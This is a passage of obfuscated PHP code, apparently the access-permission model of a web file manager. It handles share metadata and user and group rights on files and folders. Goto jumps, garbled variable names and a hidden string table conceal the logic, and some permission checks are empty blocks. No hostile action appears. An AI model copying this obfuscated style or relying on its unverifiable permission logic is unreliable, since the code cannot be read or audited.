Model($C‡©­ƒ…µÆ[1631])->where($cƒˆ§¢·)->field($C‡©­ƒ…µÆ[462])->select(); if (empty($DŞàŒ‘•³³)) { return; } goto Fèß±³ˆÑó; Fèß±³ˆÑó: $cŸÎ‘»”Ùä = array_to_keyvalue($DŞàŒ‘•³³, $C‡©­ƒ…µÆ[33], $C‡©­ƒ…µÆ[462]); $this->remove($cŸÎ‘»”Ùä); goto F·½ˆ°›ù; F·½ˆ°›ù: } private function shareFileMeta($BºÎ–„ëî, $FìŸå¯”í´ = null) { $eÃ‘’Šƒì =& $_SERVER[ç]; $B·‘ëéÙŠñ = array($eÃ‘’Šƒì[441] => $BºÎ–„ëî, $eÃ‘’Šƒì[92] => $eÃ‘’Šƒì[1820]); if (is_null($FìŸå¯”í´)) { return Model($eÃ‘’Šƒì[1821])->where($B·‘ëéÙŠñ)->find(); } $B·‘ëéÙŠñ[$eÃ‘’Šƒì[370]] = $FìŸå¯”í´; Model($eÃ‘’Šƒì[1821])->add($B·‘ëéÙŠñ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\143\145\x5f\141\165\164\150"; public function getAuth($EŞóÆŠ©æ…) { goto eÛĞá¿ô¢; eÛĞá¿ô¢: $A’Ä¸ÄË¥Í =& $_SERVER[ç]; $e¶ƒ½½¬Îë = $this->sourceAuthSelect($EŞóÆŠ©æ…); $FÄÍòƒÉñ = array(); goto eõ·¯¥«—; E‰Æô“Ÿùµ: array_multisort($B£°ªæö, SORT_DESC, $FÄÍòƒÉñ); return $FÄÍòƒÉñ; goto e‹Æ…˜–îÛ; eõ·¯¥«—: $B£°ªæö = array(); $aÔë‹¶¹‰Æ = 2 << 25; foreach ($e¶ƒ½½¬Îë as $A½Áó—ø±†) { goto E­­ñœÆ¸°; fØ«¨°ÄÅâ: if ($A½Áó—ø±†[$A’Ä¸ÄË¥Í[398]] == SourceModel::TYPE_USER && $A½Áó—ø±†[$A’Ä¸ÄË¥Í[478]] == $A’Ä¸ÄË¥Í[491]) { $Aƒ­ÜÂí• = 0; } $B£°ªæö[] = $eéâ…†‰Ï¿[$A’Ä¸ÄË¥Í[400]] + $Aƒ­ÜÂí•; goto B©½ãèñçˆ; E­­ñœÆ¸°: $eéâ…†‰Ï¿ = Model($A’Ä¸ÄË¥Í[1822])->listData($A½Áó—ø±†[$A’Ä¸ÄË¥Í[1750]]); if (!$eéâ…†‰Ï¿) { continue; } $FÄÍòƒÉñ[] = $A½Áó—ø±†; goto EÈÜ–ãœù; EÈÜ–ãœù: $Aƒ­ÜÂí• = 0; if ($A½Áó—ø±†[$A’Ä¸ÄË¥Í[398]] == SourceModel::TYPE_GROUP) { $Aƒ­ÜÂí• = $aÔë‹¶¹‰Æ * 2; } if ($A½Áó—ø±†[$A’Ä¸ÄË¥Í[398]] == SourceModel::TYPE_USER) { $Aƒ­ÜÂí• = $aÔë‹¶¹‰Æ; } goto fØ«¨°ÄÅâ; B©½ãèñçˆ: } goto E‰Æô“Ÿùµ; e‹Æ…˜–îÛ: } public function sourceAuthSelect($f¥™ ê¨—š) { goto e£İ©ƒ†§±; dÓĞÔª–»: if (count($C˜ˆˆºàå¥) == count($f¥™ ê¨—š)) { return $AÆ§éª×á ? $C˜ˆˆºàå¥[$f¥™ ê¨—š[0]] : $C˜ˆˆºàå¥; } $C®š¤÷Æ‚ = $DÚŒİ–äŒ[1823]; $b„âÍ”´„‘ = array($DÚŒİ–äŒ[390] => array($DÚŒİ–äŒ[7], $f¥™ ê¨—š)); goto fâ½Ø±ø‰; Aõ’©‰Òê¼: if ($AÆ§éª×á) { return $cËè¨¿Øõ; } return $dìŸÏÅ±Œ; goto Aóè’êÎµã; B¶óŒ„Şöã: if ($AÆ§éª×á) { $f¥™ ê¨—š = array($f¥™ ê¨—š); } $C˜ˆˆºàå¥ = array(); foreach ($f¥™ ê¨—š as $C”â·Ç†İå) { if (isset($FïÖ¹˜ƒ¡[$C”â·Ç†İå])) { $C˜ˆˆºàå¥[$C”â·Ç†İå] = $FïÖ¹˜ƒ¡[$C”â·Ç†İå]; } } goto dÓĞÔª–»; fâ½Ø±ø‰: $cËè¨¿Øõ = $this->field($C®š¤÷Æ‚)->order($DÚŒİ–äŒ[388])->where($b„âÍ”´„‘)->select(); $dìŸÏÅ±Œ = array_to_keyvalue_group($cËè¨¿Øõ, $DÚŒİ–äŒ[390]); foreach ($f¥™ ê¨—š as $C”â·Ç†İå) { $FïÖ¹˜ƒ¡[$C”â·Ç†İå] = $dìŸÏÅ±Œ[$C”â·Ç†İå] ? $dìŸÏÅ±Œ[$C”â·Ç†İå] : array(); } goto Aõ’©‰Òê¼; e£İ©ƒ†§±: $DÚŒİ–äŒ =& $_SERVER[ç]; static $FïÖ¹˜ƒ¡ = array(); $AÆ§éª×á = is_array($f¥™ ê¨—š) ? !1 : !0; goto B¶óŒ„Şöã; Aóè’êÎµã: } public function setAuth($Eæ„İ‹‰øˆ, $C‘…î³ãÂ) { goto B˜–ë¾ö‚‚; e—¢¬ƒ“: foreach ($C‘…î³ãÂ as $câŒ“ß†) { if (!in_array($câŒ“ß†[$CäÜğñ×¿Æ[398]], $b¼±¥¥·)) { show_json(LNG($CäÜğñ×¿Æ[1824]), !1); } if ($d¬—ï‡Š°‡ != $bò¬á½Ğ£) { if ($câŒ“ß†[$CäÜğñ×¿Æ[398]] == SourceModel::TYPE_GROUP) { } if ($câŒ“ß†[$CäÜğñ×¿Æ[478]] != 0 && !in_array($câŒ“ß†[$CäÜğñ×¿Æ[478]], $f‘’‰)) { } } if ($câŒ“ß†[$CäÜğñ×¿Æ[478]] == 0) { $câŒ“ß†[$CäÜğñ×¿Æ[398]] = SourceModel::TYPE_USER; } $E¥©¢˜Áå[] = array($CäÜğñ×¿Æ[390] => $Eæ„İ‹‰øˆ, $CäÜğñ×¿Æ[398] => intval($câŒ“ß†[$CäÜğñ×¿Æ[398]]), $CäÜğñ×¿Æ[478] => intval($câŒ“ß†[$CäÜğñ×¿Æ[478]]), $CäÜğñ×¿Æ[1750] => intval($câŒ“ß†[$CäÜğñ×¿Æ[1750]]) ? intval($câŒ“ß†[$CäÜğñ×¿Æ[1750]]) : 0, $CäÜğñ×¿Æ[1804] => intval($câŒ“ß†[$CäÜğñ×¿Æ[1804]]) ? intval($câŒ“ß†[$CäÜğñ×¿Æ[1804]]) : -1); } $this->where(array($CäÜğñ×¿Æ[404] => $Eæ„İ‹‰øˆ))->delete(); $this->addAll($E¥©¢˜Áå); goto f±ßç§«ˆ¥; B˜–ë¾ö‚‚: $CäÜğñ×¿Æ =& $_SERVER[ç]; $D£Ä¬­‘Ô• = Model($CäÜğñ×¿Æ[1171])->sourceInfo($Eæ„İ‹‰øˆ); if (!$D£Ä¬­‘Ô•) { return !1; } goto eâİò™è¤Æ; eâİò™è¤Æ: if ($D£Ä¬­‘Ô•[$CäÜğñ×¿Æ[398]] != SourceModel::TYPE_GROUP) { return !1; } $bò¬á½Ğ£ = 1; $d¬—ï‡Š°‡ = $D£Ä¬­‘Ô•[$CäÜğñ×¿Æ[478]]; goto F “ÙÁ¹’¬; f±ßç§«ˆ¥: return !0; goto AÃ«Ôçß¥ƒ; F “ÙÁ¹’¬: if ($d¬—ï‡Š°‡ != $bò¬á½Ğ£) { $Aì“ª²ñËÃ = array($CäÜğñ×¿Æ[1654] => $d¬—ï‡Š°‡); $f‘’‰ = Model($CäÜğñ×¿Æ[1736])->field($CäÜğñ×¿Æ[1491])->where($Aì“ª²ñËÃ)->select(); $f‘’‰ = array_to_keyvalue($f‘’‰, $CäÜğñ×¿Æ[33], $CäÜğñ×¿Æ[1491]); } $b¼±¥¥· = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $E¥©¢˜Áå = array(); goto e—¢¬ƒ“; AÃ«Ôçß¥ƒ: } public function authClear($E®éÊĞÄ¦) { $c¬…å¸ÍäŞ =& $_SERVER[ç]; $d’ë¥‹ò = Model($c¬…å¸ÍäŞ[1171])->sourceInfo($E®éÊĞÄ¦); $f¨¸ÛŠÂ’ = array($E®éÊĞÄ¦); if ($d’ë¥‹ò[$c¬…å¸ÍäŞ[397]] == $c¬…å¸ÍäŞ[86]) { $aî‰§Ãñ¹® = array($c¬…å¸ÍäŞ[548] => array($c¬…å¸ÍäŞ[507], $d’ë¥‹ò[$c¬…å¸ÍäŞ[481]] . $E®éÊĞÄ¦ . $c¬…å¸ÍäŞ[508])); $f¨¸ÛŠÂ’ = Model($c¬…å¸ÍäŞ[1171])->field($c¬…å¸ÍäŞ[404])->where($aî‰§Ãñ¹®)->getField($c¬…å¸ÍäŞ[390], !0); $f¨¸ÛŠÂ’[] = $E®éÊĞÄ¦; } $this->where(array($c¬…å¸ÍäŞ[404] => array($c¬…å¸ÍäŞ[405], $f¨¸ÛŠÂ’)))->delete(); return !0; } public function getAllChildren($c¡¬äÖ™‚) { goto CÀ³÷Àã›; CÀ³÷Àã›: $c¶²»†Şßê =& $_SERVER[ç]; $EÕïÔŒ—Çö = Model($c¶²»†Şßê[1171])->sourceInfo($c¡¬äÖ™‚); if ($EÕïÔŒ—Çö[$c¶²»†Şßê[397]] != $c¶²»†Şßê[86]) { return $this->sourceListAuth(array($c¡¬äÖ™‚)); } goto A°ÔÏº‘œÈ; A°ÔÏº‘œÈ: if ($EÕïÔŒ—Çö[$c¶²»†Şßê[398]] != SourceModel::TYPE_GROUP) { return array(); } $e‘±±öğ« = 1; $EÚñŠÂìï = array($c¡¬äÖ™‚); goto bÆæôØ‘; bÆæôØ‘: if ($EÕïÔŒ—Çö[$c¶²»†Şßê[472]] == $c¶²»†Şßê[491] && $EÕïÔŒ—Çö[$c¶²»†Şßê[478]] != $e‘±±öğ«) { $EÚñŠÂìï = $this->groupChidldAllRootSource($EÕïÔŒ—Çö[$c¶²»†Şßê[478]]); } $F¼ê­—ãœÈ = $this->field($c¶²»†Şßê[390])->group($c¶²»†Şßê[390])->select(); $F¼ê­—ãœÈ = array_to_keyvalue($F¼ê­—ãœÈ, $c¶²»†Şßê[33], $c¶²»†Şßê[390]); goto fãê´É±¼ä; eŒÁ‚èİ¦ò: return $this->sourceListAuth($c¨ÓÏ©Í’); goto A­Ì—šá¨; dÏö¯óŠ…: $eøù›İ‡³ = Model($c¶²»†Şßê[760])->field($EÕñÙ‚Òè)->where($dÑÓ–ÃíŞ½)->select(); $c¨ÓÏ©Í’ = array($c¡¬äÖ™‚); foreach ($eøù›İ‡³ as $Dé”ÉÔ²) { foreach ($EÚñŠÂìï as $f³Ì·˜¨†ˆ) { $A¼Ç„Ê«•Û = $c¶²»†Şßê[47] . $f³Ì·˜¨†ˆ . $c¶²»†Şßê[47]; $c¤¨Ä¯Şß = $Dé”ÉÔ²[$c¶²»†Şßê[481]] . $Dé”ÉÔ²[$c¶²»†Şßê[390]] . $c¶²»†Şßê[47]; if (strstr($c¤¨Ä¯Şß, $A¼Ç„Ê«•Û)) { $c¨ÓÏ©Í’[] = $Dé”ÉÔ²[$c¶²»†Şßê[390]]; break; } } } goto eŒÁ‚èİ¦ò; fãê´É±¼ä: if (!$F¼ê­—ãœÈ) { return array(); } $EÕñÙ‚Òè = $c¶²»†Şßê[1825]; $dÑÓ–ÃíŞ½ = array($c¶²»†Şßê[390] => array($c¶²»†Şßê[7], $F¼ê­—ãœÈ), $c¶²»†Şßê[417] => $c¶²»†Şßê[491]); goto dÏö¯óŠ…; A­Ì—šá¨: } private function sourceListAuth($A£èÄ‚­¯«) { goto c·ôÍ´Ğê¢; c·ôÍ´Ğê¢: $eåÉêí„–œ =& $_SERVER[ç]; $EïªÙõĞä = Model($eåÉêí„–œ[1171])->sourceListInfo($A£èÄ‚­¯«, !0); $bÎˆš¢‘Ğë = $this->sourceAuthSelect($A£èÄ‚­¯«); goto CÃÒÈÊ¤ŒÂ; CÃÒÈÊ¤ŒÂ: $fÙ¤Ëïæ¹Á = array(); $d­ÈäÁŸ˜ = array(); foreach ($EïªÙõĞä as $e©Ô»Ç°ø) { goto e¢‹†„‰; e¢‹†„‰: unset($e©Ô»Ç°ø[$eåÉêí„–œ[428]]); unset($e©Ô»Ç°ø[$eåÉêí„–œ[426]]); unset($e©Ô»Ç°ø[$eåÉêí„–œ[400]]); goto bÎã‘¶×©¹; bÎã‘¶×©¹: unset($e©Ô»Ç°ø[$eåÉêí„–œ[84]]); $bÂŒèŒ§ÙŞ = $bÎˆš¢‘Ğë[$e©Ô»Ç°ø[$eåÉêí„–œ[390]]]; if (!$bÂŒèŒ§ÙŞ) { continue; } goto BÎ½œÛâ•; BÌñºëñ’: $bŒ°Üö„ğù = count(explode($eåÉêí„–œ[8], trim($e©Ô»Ç°ø[$eåÉêí„–œ[489]], $eåÉêí„–œ[8]))); $d­ÈäÁŸ˜[] = $bŒ°Üö„ğù + ($e©Ô»Ç°ø[$eåÉêí„–œ[29]] == $eåÉêí„–œ[76] ? 0 : 1000); goto E¦Âª°Úñİ; BÎ½œÛâ•: $e©Ô»Ç°ø[$eåÉêí„–œ[1826]] = $this->authTargetInfo($bÂŒèŒ§ÙŞ); $e©Ô»Ç°ø[$eåÉêí„–œ[489]] = rtrim($e©Ô»Ç°ø[$eåÉêí„–œ[484]], $eåÉêí„–œ[8]) . $eåÉêí„–œ[8] . ltrim($e©Ô»Ç°ø[$eåÉêí„–œ[489]], $eåÉêí„–œ[8]); $fÙ¤Ëïæ¹Á[] = $e©Ô»Ç°ø; goto BÌñºëñ’; E¦Âª°Úñİ: } goto f…½ Ö©«; f…½ Ö©«: array_multisort($d­ÈäÁŸ˜, SORT_ASC, $fÙ¤Ëïæ¹Á); return $fÙ¤Ëïæ¹Á; goto b ­ÄÌÒ§œ; b ­ÄÌÒ§œ: } private function groupChidldAllRootSource($b…Êâ¡…Şç) { $C²Ä³¿Ş‡ =& $_SERVER[ç]; $aÃˆîä…ëÀ = Model($C²Ä³¿Ş‡[1827])->groupChildrenAll($b…Êâ¡…Şç); $Dò¶Œá‚ã« = array($C²Ä³¿Ş‡[472] => 0, $C²Ä³¿Ş‡[478] => array($C²Ä³¿Ş‡[7], $aÃˆîä…ëÀ), $C²Ä³¿Ş‡[398] => SourceModel::TYPE_GROUP); $c½Ä²¡Š– = Model($C²Ä³¿Ş‡[760])->field($C²Ä³¿Ş‡[390])->where($Dò¶Œá‚ã«)->select(); $c½Ä²¡Š– = array_to_keyvalue($c½Ä²¡Š–, $C²Ä³¿Ş‡[33], $C²Ä³¿Ş‡[390]); return $c½Ä²¡Š–; } private function authTargetInfo($BÁÏÁª–ÈÖ) { goto bâ‘îÓ¯; d…Šã©‹ñ©: $føÂ·¼ïõì = 2 << 25; foreach ($BÁÏÁª–ÈÖ as $BêÓŠÑèÅ‚) { goto FÔØÒºµ; fÀŒ¹‹®Ø¥: if ($BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[398]] == SourceModel::TYPE_USER && $BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[478]] == $c³æã®Ÿ»µ[491]) { $F£°ã‘Ç© = 0; } $DÇ•Ú—óÄ[] = $eÈàÊëœ[$c³æã®Ÿ»µ[400]] + $F£°ã‘Ç©; goto d¤ŸÙ“Ê‹¢; a±á½Ò ª: if (!$CÉ§×ŞÖŞè) { continue; } $CÉ§×ŞÖŞè[$c³æã®Ÿ»µ[440]] = $eÈàÊëœ; $Dª¬ãøŠ‘ğ[] = $CÉ§×ŞÖŞè; goto e®£ò‰óÉß; FÔØÒºµ: $eÈàÊëœ = Model($c³æã®Ÿ»µ[1822])->listData($BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[1750]]); if (!$eÈàÊëœ) { continue; } if ($BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[398]] == SourceModel::TYPE_USER) { $CÉ§×ŞÖŞè = Model($c³æã®Ÿ»µ[497])->getInfoSimpleOuter($BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[478]]); if ($CÉ§×ŞÖŞè[$c³æã®Ÿ»µ[1491]] == $c³æã®Ÿ»µ[1052]) { continue; } if ($CÉ§×ŞÖŞè[$c³æã®Ÿ»µ[1491]] == $c³æã®Ÿ»µ[491]) { $CÉ§×ŞÖŞè[$c³æã®Ÿ»µ[28]] = LNG($c³æã®Ÿ»µ[1828]); } } else { $CÉ§×ŞÖŞè = Model($c³æã®Ÿ»µ[480])->getInfoSimple($BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[478]]); } goto a±á½Ò ª; e®£ò‰óÉß: $F£°ã‘Ç© = 0; if ($BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[398]] == SourceModel::TYPE_GROUP) { $F£°ã‘Ç© = $føÂ·¼ïõì * 2; } if ($BêÓŠÑèÅ‚[$c³æã®Ÿ»µ[398]] == SourceModel::TYPE_USER) { $F£°ã‘Ç© = $føÂ·¼ïõì; } goto fÀŒ¹‹®Ø¥; d¤ŸÙ“Ê‹¢: } array_multisort($DÇ•Ú—óÄ, SORT_DESC, $Dª¬ãøŠ‘ğ); goto E¸›¤Ù›ëŒ; bâ‘îÓ¯: $c³æã®Ÿ»µ =& $_SERVER[ç]; $Dª¬ãøŠ‘ğ = array(); $DÇ•Ú—óÄ = array(); goto d…Šã©‹ñ©; E¸›¤Ù›ëŒ: return $Dª¬ãøŠ‘ğ; goto Fª†¤†ì¸; Fª†¤†ì¸: } public function getAllChildrenByUser($båº‚ô¯ã, $däÙÀª¡Â×) { goto EÇÂÊ¨; F·Á‡êŠÅŒ: if ($DËÊĞ³­î[$a°ŠòÏ–¢[472]] == $a°ŠòÏ–¢[491] && $DËÊĞ³­î[$a°ŠòÏ–¢[478]] != $BïÙª…ïÓ && $this->groupContainUser($DËÊĞ³­î[$a°ŠòÏ–¢[478]], $däÙÀª¡Â×)) { foreach ($CÄë³ÖÖ‘í[$a°ŠòÏ–¢[1829]] as $ešô°¹ìµã) { $c™ì¶¢°õÁ = Model($a°ŠòÏ–¢[480])->getInfo($ešô°¹ìµã[$a°ŠòÏ–¢[1654]]); $b ÈŒ¿ã = Model($a°ŠòÏ–¢[501])->getInfoSimpleOuter($däÙÀª¡Â×); $b ÈŒ¿ã[$a°ŠòÏ–¢[440]] = $ešô°¹ìµã[$a°ŠòÏ–¢[400]]; if (Model($a°ŠòÏ–¢[1822])->authCheckAction($ešô°¹ìµã[$a°ŠòÏ–¢[400]][$a°ŠòÏ–¢[400]], $a°ŠòÏ–¢[1674])) { continue; } $eÆğ‰é¹Ø¬ = array($a°ŠòÏ–¢[28] => $a°ŠòÏ–¢[1443] . $c™ì¶¢°õÁ[$a°ŠòÏ–¢[28]], $a°ŠòÏ–¢[390] => $c™ì¶¢°õÁ[$a°ŠòÏ–¢[84]][$a°ŠòÏ–¢[390]], $a°ŠòÏ–¢[75] => KodIO::make($c™ì¶¢°õÁ[$a°ŠòÏ–¢[84]][$a°ŠòÏ–¢[390]]), $a°ŠòÏ–¢[472] => $a°ŠòÏ–¢[491], $a°ŠòÏ–¢[398] => $a°ŠòÏ–¢[983], $a°ŠòÏ–¢[29] => $a°ŠòÏ–¢[512], $a°ŠòÏ–¢[489] => $c™ì¶¢°õÁ[$a°ŠòÏ–¢[485]], $a°ŠòÏ–¢[1654] => $c™ì¶¢°õÁ[$a°ŠòÏ–¢[1654]], $a°ŠòÏ–¢[482] => $c™ì¶¢°õÁ[$a°ŠòÏ–¢[472]], $a°ŠòÏ–¢[1826] => array($b ÈŒ¿ã)); $bãÎ¤Ö—ó‚[$eÆğ‰é¹Ø¬[$a°ŠòÏ–¢[390]]] = $eÆğ‰é¹Ø¬; } } $eÜŸÆàÀ£½ = array(); $A‹ğ‹ƒ±ï = $this->getAllChildren($båº‚ô¯ã); goto Cä‡®”œ·Ã; Cä‡®”œ·Ã: foreach ($A‹ğ‹ƒ±ï as $aÛŒÈ¼†À÷) { $Bä…êĞñ»™ = !1; foreach ($aÛŒÈ¼†À÷[$a°ŠòÏ–¢[1826]] as $DÎ„½¿¾¡) { if ($DÎ„½¿¾¡[$a°ŠòÏ–¢[1491]]) { if ($DÎ„½¿¾¡[$a°ŠòÏ–¢[1491]] == $däÙÀª¡Â×) { $Bä…êĞñ»™ = !0; break; } } if ($DÎ„½¿¾¡[$a°ŠòÏ–¢[1654]]) { if ($this->groupContainUser($DÎ„½¿¾¡[$a°ŠòÏ–¢[1654]], $däÙÀª¡Â×)) { $Bä…êĞñ»™ = !0; break; } } } if ($Bä…êĞñ»™) { $eÜŸÆàÀ£½[] = $aÛŒÈ¼†À÷; } $a´¿¼Í¤Íš = $aÛŒÈ¼†À÷[$a°ŠòÏ–¢[390]]; if (isset($bãÎ¤Ö—ó‚[$a´¿¼Í¤Íš])) { $aÛŒÈ¼†À÷[$a°ŠòÏ–¢[1826]][] = $bãÎ¤Ö—ó‚[$a´¿¼Í¤Íš][0]; $bãÎ¤Ö—ó‚[$a´¿¼Í¤Íš] = !1; } } $bãÎ¤Ö—ó‚ = array_filter(array_values($bãÎ¤Ö—ó‚)); $eÜŸÆàÀ£½ = array_merge($bãÎ¤Ö—ó‚, $eÜŸÆàÀ£½); goto D©®•¹Ü; FÓäğŠ¶´È: $DËÊĞ³­î = Model($a°ŠòÏ–¢[1171])->sourceInfo($båº‚ô¯ã); $bãÎ¤Ö—ó‚ = array(); $BïÙª…ïÓ = 1; goto F·Á‡êŠÅŒ; EÇÂÊ¨: $a°ŠòÏ–¢ =& $_SERVER[ç]; $CÄë³ÖÖ‘í = Model($a°ŠòÏ–¢[501])->getInfo($däÙÀª¡Â×); if (!$däÙÀª¡Â× || !$båº‚ô¯ã || !$CÄë³ÖÖ‘í) { return array(); } goto FÓäğŠ¶´È; D©®•¹Ü: return $eÜŸÆàÀ£½; goto d˜Ÿ°áôö¼; d˜Ÿ°áôö¼: } public function setAllChildrenByUser($Cî¿°‘¶—, $f™åğ¯ˆ“ˆ, $c‚ªùã·‚) { $A˜ù—±‡‹Ö =& $_SERVER[ç]; $eÎ´”êõÔá = $this->getAllChildrenByUser($Cî¿°‘¶—, $f™åğ¯ˆ“ˆ); if (!$c‚ªùã·‚ || !$eÎ´”êõÔá) { return !1; } foreach ($eÎ´”êõÔá as $C¸àñœšÎ¦) { $E«ßâ†’¼¦ = array(); foreach ($C¸àñœšÎ¦[$A˜ù—±‡‹Ö[1826]] as $B®ìÉÓÚŠ”) { $FĞÃ­“¬ ÷ = $B®ìÉÓÚŠ”[$A˜ù—±‡‹Ö[440]]; $BŠÜ¬–˜¸Š = $B®ìÉÓÚŠ”[$A˜ù—±‡‹Ö[1491]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $cˆ„Éš²Â = $B®ìÉÓÚŠ”[$A˜ù—±‡‹Ö[1491]] ? $B®ìÉÓÚŠ”[$A˜ù—±‡‹Ö[1491]] : $B®ìÉÓÚŠ”[$A˜ù—±‡‹Ö[1654]]; if ($B®ìÉÓÚŠ”[$A˜ù—±‡‹Ö[1491]] && $B®ìÉÓÚŠ”[$A˜ù—±‡‹Ö[1491]] == $f™åğ¯ˆ“ˆ) { continue; } $E«ßâ†’¼¦[] = array($A˜ù—±‡‹Ö[390] => $C¸àñœšÎ¦[$A˜ù—±‡‹Ö[390]], $A˜ù—±‡‹Ö[398] => $BŠÜ¬–˜¸Š, $A˜ù—±‡‹Ö[478] => intval($cˆ„Éš²Â), $A˜ù—±‡‹Ö[1750] => isset($FĞÃ­“¬ ÷[$A˜ù—±‡‹Ö[388]]) ? intval($FĞÃ­“¬ ÷[$A˜ù—±‡‹Ö[388]]) : 0, $A˜ù—±‡‹Ö[1804] => isset($FĞÃ­“¬ ÷[$A˜ù—±‡‹Ö[1804]]) ? intval($FĞÃ­“¬ ÷[$A˜ù—±‡‹Ö[1804]]) : -1); } $E«ßâ†’¼¦[] = array($A˜ù—±‡‹Ö[390] => $C¸àñœšÎ¦[$A˜ù—±‡‹Ö[390]], $A˜ù—±‡‹Ö[398] => SourceModel::TYPE_USER, $A˜ù—±‡‹Ö[478] => intval($f™åğ¯ˆ“ˆ), $A˜ù—±‡‹Ö[1750] => intval($c‚ªùã·‚), $A˜ù—±‡‹Ö[1804] => -1); $this->where(array($A˜ù—±‡‹Ö[404] => $C¸àñœšÎ¦[$A˜ù—±‡‹Ö[390]]))->delete(); $this->addAll($E«ßâ†’¼¦); } return !0; } public function get($FîÕ‡„²·é) { $EîÊ§õĞ¾Ã = $this->getSourceList(array($FîÕ‡„²·é), !0); return $EîÊ§õĞ¾Ã[0]; } public function getSourceList($E»…ÅÙÚË, $fâßªŞœ¶ = false, $Då®…ÓÂ· = false) { goto bõ”Ó¾Œ”; bõ”Ó¾Œ”: $Fœä——–ô• =& $_SERVER[ç]; if (!$E»…ÅÙÚË) { return array(); } $bÒÍŞÍóÌ· = Model($Fœä——–ô•[1171]); goto AõŞñœšÒ; aÓ‹İš¹¬ã: $AÎñìó…¶Ö = array(); foreach ($fâßªŞœ¶ as $e¡ÕğÃÉÃé => $CŠÌ•ãÅ) { if ($CÑ­˜äÆË°) { $AÎñìó…¶Ö[$e¡ÕğÃÉÃé] = $E­³‡µ˜ôÛ; continue; } $AÎñìó…¶Ö[$e¡ÕğÃÉÃé] = $this->makeSourceAuth($CŠÌ•ãÅ, $cñŠÊ­È®¨, $Då®…ÓÂ·); } return $AÎñìó…¶Ö; goto dËÜ¥ÄËçà; AõŞñœšÒ: if (!$fâßªŞœ¶ && count($E»…ÅÙÚË) == 1) { $fâßªŞœ¶ = array(); $fâßªŞœ¶[$E»…ÅÙÚË[0]] = $bÒÍŞÍóÌ·->sourceInfo($E»…ÅÙÚË[0]); } if (!$fâßªŞœ¶) { $C”óËé™ƒ¶ = array($Fœä——–ô•[404] => array($Fœä——–ô•[405], $E»…ÅÙÚË)); $fâßªŞœ¶ = $bÒÍŞÍóÌ·->field($Fœä——–ô•[1830])->where($C”óËé™ƒ¶)->select(); $fâßªŞœ¶ = array_to_keyvalue($fâßªŞœ¶, $Fœä——–ô•[390]); } $eƒ…œ¥×¯ã = $E»…ÅÙÚË; goto e¢õôÇ£½˜; añÌŸù—õÒ: $eùÍòõ‰ï‰ = $this->sourceAuthSelect($eƒ…œ¥×¯ã); $cñŠÊ­È®¨ = array(); foreach ($eƒ…œ¥×¯ã as $e¡ÕğÃÉÃé) { if (isset($eùÍòõ‰ï‰[$e¡ÕğÃÉÃé])) { $cñŠÊ­È®¨[$e¡ÕğÃÉÃé] = $eùÍòõ‰ï‰[$e¡ÕğÃÉÃé]; } } goto D²¤ÜêÁÅ; D²¤ÜêÁÅ: $CÑ­˜äÆË° = $this->userIsRoot($Då®…ÓÂ·); $EÊª¡ ƒ = AuthModel::authAll(); $E­³‡µ˜ôÛ = array($Fœä——–ô•[401] => $EÊª¡ ƒ, $Fœä——–ô•[1831] => array($Fœä——–ô•[406] => 0, $Fœä——–ô•[1660] => $EÊª¡ ƒ, $Fœä——–ô•[407] => LNG($Fœä——–ô•[1832]), $Fœä——–ô•[1675] => $Fœä——–ô•[1833])); goto aÓ‹İš¹¬ã; e¢õôÇ£½˜: foreach ($fâßªŞœ¶ as $a¨¹Û±¨ùë => $B‹ÓÅ±ù°) { $A·ø«µ‚‡§ = $bÒÍŞÍóÌ·->parentLevelArray($B‹ÓÅ±ù°[$Fœä——–ô•[481]]); $eƒ…œ¥×¯ã = array_merge($eƒ…œ¥×¯ã, array($a¨¹Û±¨ùë), array_reverse($A·ø«µ‚‡§)); } $eƒ…œ¥×¯ã = array_values(array_unique($eƒ…œ¥×¯ã)); if (!$eƒ…œ¥×¯ã) { return array(); } goto añÌŸù—õÒ; dËÜ¥ÄËçà: } public function authDeepCheck($cÀß¿©ß­œ, $f¿‚™ô…§£ = false) { goto a®„¤ÏÍ·†; a®„¤ÏÍ·†: $F»ÕÄÆÛá =& $_SERVER[ç]; $f¿‚™ô…§£ = $f¿‚™ô…§£ ? $f¿‚™ô…§£ : USER_ID; $BÍğ¥æ‡ = $this->makeAuthDeep($f¿‚™ô…§£); goto Bßì³Ôğµ; Bßì³Ôğµ: if (!in_array($cÀß¿©ß­œ, $BÍğ¥æ‡[$F»ÕÄÆÛá[1834]])) { return !1; } $A´ó¤Ä×ÉÀ = array(); foreach ($BÍğ¥æ‡[$F»ÕÄÆÛá[1835]] as $CˆŒµš†‚„ => $E‡ëğÅÏº) { if (!in_array($cÀß¿©ß­œ, $E‡ëğÅÏº)) { continue; } $A´ó¤Ä×ÉÀ[] = $CˆŒµš†‚„; } goto A·äğ«ÜôÒ; A·äğ«ÜôÒ: if (!$A´ó¤Ä×ÉÀ) { return !1; } $AšëÍ«ŸÈ = $A´ó¤Ä×ÉÀ ? $A´ó¤Ä×ÉÀ[0] : $cÀß¿©ß­œ; return array($F»ÕÄÆÛá[401] => -1, $F»ÕÄÆÛá[440] => array($F»ÕÄÆÛá[406] => $F»ÕÄÆÛá[1052], $F»ÕÄÆÛá[1660] => $F»ÕÄÆÛá[491], $F»ÕÄÆÛá[407] => LNG($F»ÕÄÆÛá[1836]), $F»ÕÄÆÛá[1675] => $F»ÕÄÆÛá[1837]), $F»ÕÄÆÛá[1838] => LNG($F»ÕÄÆÛá[1839]), $F»ÕÄÆÛá[1840] => $this->sourceAuthInfo($AšëÍ«ŸÈ)); goto d£‚Ùï­Š–; d£‚Ùï­Š–: } protected function makeAuthDeep($eÃÔÀÒ“Î = false) { goto CÕÃ×à¿ØŸ; DŒÜ¥Ù¡‡: $cŸÄ°ğÜ  = array_to_keyvalue_group($Cİæ¿˜•Î, $e™•ˆÛïÙ…[390]); foreach ($cŸÄ°ğÜ  as $F­Š¬‘¸Ş¸ => $EÇºŒ¦ÈÕ…) { $aæ½Œ…ºí = $this->authArrayCheck($EÇºŒ¦ÈÕ…, $eÃÔÀÒ“Î); if 